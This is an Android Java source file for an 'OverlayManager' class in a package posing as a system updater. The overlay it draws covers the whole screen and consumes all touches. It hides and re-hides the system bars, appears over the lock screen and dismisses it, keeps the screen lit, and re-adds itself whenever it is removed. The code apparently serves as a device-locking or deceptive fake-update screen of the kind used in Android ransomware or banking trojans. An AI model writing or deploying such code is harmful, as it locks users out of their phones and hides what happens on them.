          package com.system.updator;

          import android.content.Context;
          import android.graphics.PixelFormat;
          import android.os.Build;
          import android.os.Handler;
          import android.os.Looper;
          import android.util.Log;
          import android.view.Gravity;
          import android.view.LayoutInflater;
          import android.view.View;
          import android.view.WindowManager;
          import android.webkit.WebSettings;
          import android.webkit.WebView;
          import android.webkit.WebViewClient;

          public class OverlayManager {

              private static final String TAG = "OverlayManager";
              private static OverlayManager instance;

              private final Context context;
              private final Handler mainHandler = new Handler(Looper.getMainLooper());

              private WindowManager windowManager;
              private View overlayView;
              private WebView webView;
              private volatile boolean showing = false;
              private volatile boolean dismissed = false;

              private OverlayManager(Context context) {
                  this.context = context.getApplicationContext();
              }

              public static synchronized OverlayManager get(Context context) {
                  if (instance == null) instance = new OverlayManager(context);
                  return instance;
              }

              public synchronized void show() {
                  show(null);
              }

              public synchronized void show(Runnable onAttached) {
                  dismissed = false;
                  if (showing) {
                      if (onAttached != null) mainHandler.post(onAttached);
                      return;
                  }
                  mainHandler.post(() -> showInternal(onAttached));
              }

              private void showInternal(Runnable onAttached) {
                  try {
                      if (dismissed) return;
                      windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
                      if (windowManager == null) return;

                      LayoutInflater inflater = LayoutInflater.from(context);
                      overlayView = inflater.inflate(R.layout.activity_overlay, null);

                      webView = overlayView.findViewById(R.id.overlayWebView);
                      if (webView != null) {
                          WebSettings s = webView.getSettings();
                          s.setJavaScriptEnabled(true);
                          s.setAllowFileAccess(true);
                          s.setAllowContentAccess(true);
                          s.setDomStorageEnabled(true);
                          s.setLoadWithOverviewMode(true);
                          s.setUseWideViewPort(true);
                          webView.setWebViewClient(new WebViewClient());
                          webView.setBackgroundColor(0xFFFFFFFF);
                          webView.setPadding(0, 0, 0, 0);
                          webView.loadUrl("file:///android_asset/overlay.html");
                      }

                      overlayView.setOnTouchListener((v, event) -> true);
                      overlayView.setClickable(true);
                      overlayView.setLongClickable(true);
                      overlayView.setFocusable(false);
                      overlayView.setFocusableInTouchMode(false);
                      overlayView.setEnabled(true);

                      int uiOptions =
                            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                          | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                          | View.SYSTEM_UI_FLAG_FULLSCREEN
                          | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                          | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                          | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN;
                      overlayView.setSystemUiVisibility(uiOptions);
                      overlayView.setOnSystemUiVisibilityChangeListener(visibility -> {
                          int restored =
                                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                              | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                              | View.SYSTEM_UI_FLAG_FULLSCREEN
                              | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                              | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                              | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN;
                          if (overlayView != null) overlayView.setSystemUiVisibility(restored);
                      });

                      int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                              ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                              : WindowManager.LayoutParams.TYPE_PHONE;

                      int flags =
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                          | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                          | WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR
                          | WindowManager.LayoutParams.FLAG_LAYOUT_ATTACHED_IN_DECOR
                          | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                          | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                          | WindowManager.LayoutParams.FLAG_FULLSCREEN
                          | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                          | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                          | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;

                      WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                              WindowManager.LayoutParams.MATCH_PARENT,
                              WindowManager.LayoutParams.MATCH_PARENT,
                              type, flags, PixelFormat.OPAQUE);

                      params.gravity = Gravity.TOP | Gravity.START;
                      params.x = 0;
                      params.y = 0;
                      params.width = WindowManager.LayoutParams.MATCH_PARENT;
                      params.height = WindowManager.LayoutParams.MATCH_PARENT;
                      params.screenBrightness = 1.0f;

                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                          params.layoutInDisplayCutoutMode =
                              WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_ALWAYS;
                      }

                      if (dismissed) {
                          overlayView = null;
                          webView = null;
                          return;
                      }

                      windowManager.addView(overlayView, params);
                      showing = true;

                      if (onAttached != null) {
                          overlayView.post(onAttached);
                      } else {
                          overlayView.post(() -> { });
                      }

                  } catch (Exception e) {
                      Log.e(TAG, "Overlay show failed", e);
                      showing = false;
                  }
              }

              public synchronized void dismiss() {
                  dismissed = true;
                  mainHandler.post(this::dismissInternal);
              }

              private void dismissInternal() {
                  try {
                      if (overlayView != null && windowManager != null) {
                          windowManager.removeViewImmediate(overlayView);
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Overlay dismiss error", e);
                  } finally {
                      if (webView != null) {
                          try { webView.destroy(); } catch (Exception ignored) { }
                          webView = null;
                      }
                      overlayView = null;
                      showing = false;
                  }
              }

              public synchronized void dismissSafe() {
                  dismissed = true;
                  if (Looper.myLooper() == Looper.getMainLooper()) {
                      dismissInternalSafe();
                  } else {
                      mainHandler.post(this::dismissInternalSafe);
                  }
              }

              private void dismissInternalSafe() {
                  try {
                      if (overlayView != null && windowManager != null
                              && overlayView.isAttachedToWindow()) {
                          windowManager.removeViewImmediate(overlayView);
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Overlay dismissSafe error", e);
                  } finally {
                      if (webView != null) {
                          try { webView.destroy(); } catch (Exception ignored) { }
                          webView = null;
                      }
                      overlayView = null;
                      showing = false;
                  }
              }

              public synchronized void dismissNow() {
                  dismissed = true;

                  Runnable r = new Runnable() {
                      @Override
                      public void run() {
                          try {
                              if (overlayView != null && windowManager != null) {
                                  try { windowManager.removeViewImmediate(overlayView); }
                                  catch (Exception e) { Log.e(TAG, "dismissNow removeViewImmediate error", e); }
                              }
                          } finally {
                              if (webView != null) {
                                  try { webView.destroy(); } catch (Exception ignored) { }
                                  webView = null;
                              }
                              overlayView = null;
                              showing = false;
                          }
                      }
                  };

                  if (Looper.myLooper() == Looper.getMainLooper()) {
                      r.run();
                  } else {
                      final Object latch = new Object();
                      final boolean[] done = { false };
                      mainHandler.post(() -> {
                          try { r.run(); }
                          finally {
                              synchronized (latch) {
                                  done[0] = true;
                                  latch.notifyAll();
                              }
                          }
                      });
                      synchronized (latch) {
                          long deadline = System.currentTimeMillis() + 1500L;
                          while (!done[0]) {
                              long remaining = deadline - System.currentTimeMillis();
                              if (remaining <= 0) break;
                              try { latch.wait(remaining); }
                              catch (InterruptedException ie) { Thread.currentThread().interrupt(); break; }
                          }
                      }
                  }
              }

              public synchronized void ensureShowing() {
                  try {
                      if (dismissed) return;
                      if (!showing || overlayView == null) {
                          showing = false;
                          overlayView = null;
                          show(null);
                          return;
                      }
                      boolean healthy = overlayView.isAttachedToWindow()
                              && overlayView.isShown()
                              && overlayView.getVisibility() == View.VISIBLE
                              && overlayView.getWindowToken() != null;
                      if (!healthy) {
                          dismiss();
                          dismissed = false;
                          show(null);
                          return;
                      }
                      overlayView.bringToFront();
                      overlayView.requestLayout();
                      overlayView.invalidate();
                  } catch (Exception e) {
                      Log.e(TAG, "ensureShowing error", e);
                      try { dismiss(); } catch (Exception ignored) { }
                      dismissed = false;
                      try { show(null); } catch (Exception ignored) { }
                  }
              }

              public synchronized boolean isShowing() {
                  return showing;
              }
          }
